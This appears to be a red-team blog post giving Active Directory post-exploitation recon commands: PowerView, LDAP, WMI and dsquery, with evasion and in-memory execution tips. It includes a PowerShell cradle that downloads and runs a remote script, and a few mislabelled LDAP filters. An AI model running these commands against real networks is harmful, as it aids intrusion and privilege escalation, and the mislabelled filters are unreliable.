---
layout: post
title: windows post-exp 2
date: 2025-05-01
description: windows AD recon for lateral movement
categories: windows
---


## Domain Recon for lateral moviment
> ___

Depois de conseguir acesso a uma maquina que faz parte de um dominio AD, o reconhecimento de um (ou mais) dominio(s) AD é essencial para identificar outras contas de usuário, serviços, grupos e suas permissões (GPOs, ACLs, ACEs, etc), para assim encontrar formas de movimentar lateralmente e elevar privilégios no dominio AD.

A ideia aqui é mostrar algumas formas de reconhecimento que são baseadas em protocolos nativos usados pelo AD e pelo s.o windows, com o objetivo de tirar vantagem de ferramentas usadas nativamente e ser mais furtivo numa atepa conhecida pelos redteamers como Situational Awareness...

- Account Discovery: Domain Account
- https://attack.mitre.org/techniques/T1087/002/

- AD https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/index.html
  - https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet
  - https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-adds-enumerate/

#### opsec tips

- https://github.com/RistBS/Awesome-RedTeam-Cheatsheet/blob/master/Miscs/OPSEC%20Guide.md

- do ldap queries more specific that not consume high processing to execute.

- tools that use wldap32.dll can be detected more easily.

- execute in memory post-exp tools.


## PowerView
> ___

What powerview does is basically instantiate the DirectorySearcher object and use LDAP filters to query specific objects (more details below in the raw ldap query examples)

- https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993
- https://05t3.github.io/posts/PowerView-Walkthrough/
- https://book.hacktricks.wiki/en/windows-hardening/basic-powershell-for-pentesters/powerview.html
- https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-adds-enumerate/#using-powerview


- load pv in memory
```
$netobj = New-Object System.Net.WebClient;
IEX($netobj.DownloadString('https://sf-res.com/miniview.ps1'));
```

- get domain controller
```
> Get-DomainController | select Forest, Name, OSVersion | fl
```

- info all users
```
PS X:> Get-NetUser | select name, lastlogontimestamp, serviceprincipalname, admincount, memberof | Format-Table -Wrap -AutoSize 

PS X:> get-domainuser -Properties distinguishedname,memberof

PS X:> Get-UserProperties -Properties name,memberof,description,info
```

- groups and memberships
```
PS X:> Get-NetGroup -FullData | select name, description | Format-Table -Wrap -AutoSize 

PS X:\> Get-NetGroup | Get-NetGroupMember -FullData | ForEach-Object -Process {"$($_.GroupName), $($_.MemberName), $($_.description)"}

PS X:> get-domaingroup -Properties distinguishedname,samaccountname,member

PS X:> get-domaingroup -MemberIdentity <USERNAME>
```

- list domain admins members
```
PS X:\> Get-NetGroupMember -GroupName "domain admins"
```

- running processes
```
PS X:\> Get-Process | Select-Object id, name, username, path | Format-Table -Wrap -AutoSize
```

- list machines 
```
PS X:\> Get-NetComputer -FullData | select cn, operatingsystem, logoncount, lastlogon | Format-Table -Wrap -AutoSize
```

- list services accounts
```
PS X:\> Get-NetUser | select name,serviceprincipalname | Format-Table -Wrap -AutoSize
```

- Domain trust
```
> Get-DomainTrust
```

- Identify AS-REP vulnerable account
```
> Get-ADUser - Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol | Format-Table name

> (Get-ACL "AD:$((Get-ADUser -Filter 'useraccountcontrol -band 4194304').distinguishedname)").access

> (Get-ACL "AD:$((Get-ADcomputer brmssql).distinguishedname)").access
```

- Enum ACLs
```
> Get-DomainObjectAcl -SamAccountName <TARGET-USER> -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq "GenericAll"}

> Get-DomainGroup "Domain Admins" -FullData

> Get-DomainObjectAcl -ResolveGUIDs | ? {$_;objectdn -eq "CN=Domain Admins,CN=Users,DC=local,DC=domain"}

> Get-DomainObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=local,DC=domain" -and $_.IdentityReference -eq "domain\<username>"}
```

- Enum GPOs
```
> Get-DomainGPO -ComputerIdentity <WORKSTATION> -Properties DisplayName | sort -Property DisplayName

> Get-DomainLocalGroup | select GPODisplayName, GroupName

> Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}


- show all SIDs that can create new GPOs (convert sids with ConvertFrom-SID)
> Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=domain,DC=local" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl


- show principals that can write to the GP-Link attribute on OUs
> Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN, SecurityIdentifier | fl


- list machines within an OU
> Get-DomainComputer | ? { $_.DistinguishedName -match "OU=Tier 1" } | select DnsHostName
```

```
> Invoke-ACLScanner

- Check for GPO Edit rights, Passwrod Change and User Addition privileges
- Check for users who can roll out scheduled tasks or add new GPOs to OUs or Computers
- Check for users with the following for DCSync permissions:
  - DS-Replication-Get-Changes
  - Replication Directory Changes All
  - Replication Directory Changes In Filtered Set

- https://github.com/FSecureLABS/SharpGPOAbuse 
```


## LDAP queries + PS
> ___

All machines in the AD forest rely on LDAP to request copies of AD objects such as users, groups, machines, and GPO settings for caching purposes. The use of LDAP is so prevalent that we are able to leverage it to perform a decent amount of domain reconnaissance without triggering any alerts.

Here we call the DirectorySearcher object in PowerShell to search and perform queries against Active Directory Domain Services in LDAP.

#### general queries

- dump all ldap info
```powershell
$searcher = New-Object System.DirectoryServices.DirectorySearcher
$searcher.FindAll()
```

- oneline query
```powershell

(New-Object System.DirectoryServices.DirectorySearcher -Property @{ Filter = "(objectClass=user)"; PageSize = 0 }).FindAll()

$searcher = New-Object System.DirectoryServices.DirectorySearcher -Property @{ Filter = "(objectClass=user)"; PageSize = 0 }
$searcher.FindAll()
```

- short example query using "[adsisearcher]". Is the same result of others examples.
- https://www.secuinfra.com/en/techtalk/adsisearcher-get-the-object-of-interest-search-for-specific-users-and-computers/
```powershell


DirectorySearcher               LDAP filters                            call these
instance class                      |                                       |
      |
([adsisearcher]"(memberOf=CN=Domain Admins,CN=users,DC=domain,DC=com)").FindAll()



$search=[adsisearcher]'(memberOf=CN=Domain Admins,CN=users,DC=domain,DC=com)'
$search.FindAll()

```


- query all users
```powershell
$searcher = New-Object DirectoryServices.DirectorySearcher
$searcher.Filter = "(objectClass=user)"
$searcher.PropertiesToLoad.Add("cn")
$searcher.PageSize = 1000
$searcher.FindAll()
```

- GPOs
```powershell
$searcher = New-Object System.DirectoryServices.DirectorySearcher
$searcher.SearchRoot = "LDAP://CN=Policies,CN=System,DC=domain,DC=com"
$searcher.Filter = "(objectClass=groupPolicyContainer)"
$searcher.PageSize = 1000
$searcher.FindAll()
```

- find all OUs
```powershell
$search = New-Object System.DirectoryServices.DirectorySearcher
$search.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry
$search.Filter = "(objectCategory=organizationalUnit)"
$search.FindAll()
```

- some filters
```powershell
- Collects names and metadata of hosts in the domain.
Base Object: dc=[REDACTED],dc=local
"(objectCategory=CN=Computer,CN=Schema,CN=Configuration,DC=[REDACTED],DC=local)"

- Collects trust information in the domain.
Base Object: dc=[REDACTED],dc=local,
"(objectCategory=CN=Trusted-Domain,CN=Schema,CN=Configuration,DC=[REDACTED],DC=local)"

- Collects Domain Administrators and Service Principals in the domain (need fix).
Base Object: DC=[REDACTED],DC=local 
"( & ( &(sAMAccountType=805306368) (servicePrincipalName=*) ( ! (sAMAccountName=krbtgt) ) ( ! (userAccountControl&2) ) ) (adminCount=1) )"

- Find disabled users
(&(objectcategory=user)(UserAccountControl:1.2.840.113556.1.4.803:=2))

- Find users with password never expires attribute
(&(objectcategory=user)(UserAccountControl:1.2.840.113556.1.4.803:=2))

- Find all users created at a certain time period
(&(objectcategory=user)(whencreated>=20190101000000.0Z))
(&(&(&(objectclass=user)(whencreate>=20210101000000.0Z))))
(&(&(objectclass=user)(whencreate>=20210101000000.0Z&<=20190101000000.0Z&)))

- Find all users who mmust change password at next logon
(&(objectcategory=user)(pwdlastset=0))

- Find users with password expired
(&(objectcategory=user)(UserAccountControl:1.2.840.113556.1.4.803:=8388608))

- Find users with locked accounts
(&(objectcategory=user)(UserAccountControl:1.2.840.113556.1.4.803:=16))

- Find users who have never logged on
(&(objectcategory=user)(lastlogon=0))

- Find all XP based S.O or windows 7/2008 R2
(&(objectcategory=computer)(operatingsystemversion=5.1*))
(&(objectcategory=computer)(operatingsystemversion=6.1*))

- Find sccounts with 'service' keyword in description
(objectcategory=user)(description=*service*)

- Find empty groups
(objectcategory=group)(!member=*)

- Find users with empty profile path
(objectcategory=person)(!profilepath=*)

- Find all users, except disabled ones
(objectcategory=person)(objectclass=user)(!UserAccountControl:1.2.840.113556.1.4.803:=2)

- Find users with email
(objectcategory=person)(mail=*)

- Find users without email
(objectcategory=person)(!mail=*)
```

- accounts with SPN
```powershell
$search = New-Object System.DirectoryServices.DirectorySearcher
$search.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry
$search.PageSize = 1000
$search.Filter = "(&(objectclass=user)(objectcategory=user)(servicePrincipalName=*))"
$search.SearchScope = "Subtree"
$search.FindAll()
```

- service account name convention filter
```powershell
"(&(objectclass=Person)(cn=*svc*))"
```

- clear variable content 
``` Clear-Variable -Name <VAR-NAME> ```



## Offensive WMI (Get-WmiObject)
> ___

- https://0xinfection.github.io/posts/wmi-recon-enum/
- https://0xinfection.github.io/posts/wmi-ad-enum/


WMI is simply another way of exposing and interacting with internal Windows components.

If we are really wary about any type of communication with the domain controller, we can disguise ourselves further by directly querying domain objects cached by Windows. These objects are exposed through WMI classes such as win32_groupindomain and Win32_UserAccount. The data might be out of date, but it can prove sufficient in many settings:

```A partir do PowerShell 3.0, esse cmdlet foi substituído por Get-CimInstance.```

- o.s info

```
PS > Get-WmiObject -Class win32_computersystem -Property bootupstate,username,totalphysicalmemory,systemtype,systemfamily,domain,dnshostname,oemstringarray

PS > Get-WmiObject -Class win32_operatingsystem | fl *
```

- find domain name

```
PS > Get-WmiObject -Namespace root\directory\ldap -Class ds_domain | select ds_dc, ds_distinguishedname, pscomputername
```

- find domain controller

```
PS > Get-WmiObject -Namespace root\directory\ldap -Class ds_computer | where { $_.ds_useraccountcontrol -match 532480 } | select ds_cn, ds_dnshostname, ds_operatingsystem, ds_lastlogon, ds_pwdlastset
```


- Often searching for file patterns using wildcards is helpful. We can make use of the -Filter argument of the cmdlet to achieve something similar. Let’s say we’re interested in directory paths that have a folder called snapshots. Querying it with WMI would look like this:

```
Get-WmiObject -Class win32_directory -Filter 'name LIKE "%snapshots%"'
```

- list services running

```
PS > Get-WmiObject win32_service -filter "state='running'" | select name,processid,pathname | Format-Table -Wrap -AutoSize

PS > Get-WmiObject -Class win32_service -Filter 'startname="localsystem"' | select *
```

- list machines

```
PS > Get-WmiObject -Namespace root\directory\ldap -Class ds_computer | select ds_cn
```


- list shares

```
PS > Get-WmiObject -Class win32_share | select type,name,allowmaximum,description,scope
```

- list users, groups

```
PS > Get-WmiObject -Class win32_useraccount

PS > Get-WmiObject -Class win32_useraccount | select name, domain, accounttype

PS > Get-WmiObject -Class win32_useraccount -Filter 'domain="infected"' | select caption


Get-WmiObject -Class win32_loggedonuser | where { $_ -match 'infected' } | foreach {[wmi]$_.antecedent}
```
```
PS > Get-WmiObject -Class win32_group

PS > Get-WmiObject -Class win32_groupindomain | foreach {[wmi]$_.partcomponent}
```

- find group members and group that user is member

```
PS > Get-WmiObject -Class win32_groupuser | where { $_.groupcomponent -match 'domain admins' } | foreach {[wmi]$_.partcomponent}


PS > Get-WmiObject -Class win32_groupuser | where { $_.partcomponent -match 'Administrator' } | foreach {[wmi]$_.groupcomponent}
```


#### Obs

As técnicas de enumaração apresentadas acima requerem uma certa "curva de aprendizado" porque envolvem o entendimento de objetos AD e filtros que podem ser utilizados para ler esses objetos. Além disso, ainda é necessario rodar os comandos manualmente, o que gera mais um pouco de trabalho manual. E mesmo tendo esse trabalho adicional, essa é uma forma mais "furtiva" de fazer um reconhecimento num dominio AD porque gera menos ruido (obviamente isso depende das defesas que estão presentes e o quanto elas são eficientes).

Vale também resaltar que existem varias outras ferrementas nativas que podem ser usadas para recon como a suite de comandos [Net](https://attack.mitre.org/software/S0039/), a dsquery, e varias outras que podem nos dar informações sobre a maquina local e sobre o dominio (você pode achar por ai pelo nome da tecnica ```living off the land (LOTL)``` [ref](https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-038a)).

De todas as refs essas aqui são as mais relevantes porque detalham como as queries ldap podem ser detectadas e da exemplos reais de como a threat actors fazem:

- https://cravaterouge.com/articles/ldapad-logging/
- https://unit42.paloaltonetworks.com/lightweight-directory-access-protocol-based-attacks/
- https://www.cisa.gov/sites/default/files/2024-02/aa24-046a-threat-actor-leverages-compromised%20account-of%20former-employee.pdf


#### refs

- https://powershellcommands.com/query-ldap-with-powershell

- https://blog.netwrix.com/2022/08/31/discovering-service-accounts-without-using-privileges/

- https://www.youtube.com/watch?v=-xF6bvbXCGE

- https://techexpert.tips/powershell/powershell-ldap-query-active-directory/

- https://gist.github.com/Erreinion/76660c012ad05ab90182

- https://posts.specterops.io/an-introduction-to-manual-active-directory-querying-with-dsquery-and-ldapsearch-84943c13d7eb

- https://posts.specterops.io/manual-ldap-querying-part-2-8a65099e12e3


## In-Memory execution 
> ___


Outra forma de furtividade ao executar ferramentas ou comandos é "em memoria". Existem varias técnicas para execução em memoria, mas todas elas necessitam de um processo ja existente na maquina alvo.

Uma das tecnicas é a de Process Injection, geralmente usado em algum tipo de stager/dropper que executam um shellcode na memoria do proprio ou de outro processo para fazer callback no C2.

Outras tecnicas envolvem usar um implant ja rodando para executar outras ferramentas da mesma forma, no proprio ou em criando outro. Essas tecnicas são usadas por varios C2 frameworks como o cobalt strike, sliver, metasploit, etc. Algumas delas são: Execute-Assembly, SideLoad, Reflective dll injection, entre outros.

O c2 Sliver implementa essas tecnicas que podem ser usadas para pós-exploração. Elas são executadas na cli como execute-assembly, sideload, spawndll e tambem as extensões ou aliases, vou deixar referencias a baixo. 

No Metasoploit você pode usar o modulo "shellcode_inject". Nesse modulo você precisa ter um sessão ativa e saber em qual processo na maquina alvo é possivel executar. Aqui tem um exemplo de como pode ser usado https://github.com/geleiaa/blog-repo/blob/main/posts/2025-05-19-AdversarialTradecraftNotes.md#process-injection

Assim como o cobaltstrike que é basicamente todos os modulos de pós-exploração são baseados em execução em memoria...


- Sliver Extencions https://dominicbreuker.com/post/learning_sliver_c2_12_extensions/

- Sliver Execute-Assembly https://dominicbreuker.com/post/learning_sliver_c2_09_execute_assembly/

- Sliver Sideload https://dominicbreuker.com/post/learning_sliver_c2_10_sideload/

- Sliver Reflective Dll https://dominicbreuker.com/post/learning_sliver_c2_11_spawndll/

- MSF shellcode injec https://web.archive.org/web/20240313192232/https://iwantmore.pizza/posts/meterpreter-shellcode-inject.html

- Cobaltstrike in memory execution https://www.cobaltstrike.com/blog/in-memory-evasion


## Tools for automate recon 
> ___

- Seatbelt https://github.com/GhostPack/Seatbelt (exec inmemory)

- SharpUp (lpe checks) https://github.com/GhostPack/SharpUp (exec inmemory)

- SharpWMI https://github.com/GhostPack/SharpWMI (exec inmemory)

- SharpView (C# powerview) https://github.com/tevora-threat/SharpView (exec inmemory)

- ADSearch https://github.com/tomcarver16/ADSearch

- AdFind http://www.joeware.net/freetools/tools/adfind/
  - https://thedfirreport.com/2020/05/08/adfind-recon/

- https://github.com/adrecon/ADRecon  

- https://github.com/securethelogs/RedRabbit/blob/master/RedRabbit.ps1

- https://github.com/itm4n/PrivescCheck

- https://github.com/xforcered/SoaPy

- https://juggernaut-sec.com/tag/ldapsearch/ (ldapsearch examples)
  - https://docs.ldap.com/ldap-sdk/docs/tool-usages/ldapsearch.html
  - https://docs.redhat.com/en/documentation/red_hat_directory_server/11/html/administration_guide/examples-of-common-ldapsearches#Examples-of-common-ldapsearches


- dsquery ex:
```
dsquery.exe * -filter "(objectCategory=Person)" -attr cn title displayName description department company sAMAccountName mail mobile telephoneNumber whenCreated whenChanged logonCount badPwdCount distinguishedName -L -limit 0
dsquery.exe * -filter "(objectCategory=Computer)" -attr cn operatingSystem operatingSystemServicePack operatingSystemVersion dNSHostName whenCreated whenChanged lastLogonTimestamp distinguishedName description managedBy mS-DS-CreatorSID -limit 0
dsquery.exe * -filter "(objectCategory=Computer)" -attr cn servicePrincipalName -L -limit 0
dsquery.exe * -filter "(objectCategory=Group)" -uc -attr cn sAMAccountName distinguishedName description -limit 0
dsquery.exe * -filter "(objectClass=organizationalUnit)" -attr ou name whenCreated distinguishedName gPLink -limit 0
```


#### Conforme eu for achando e testando tecnicas e tools novas vou atualizar aqui.

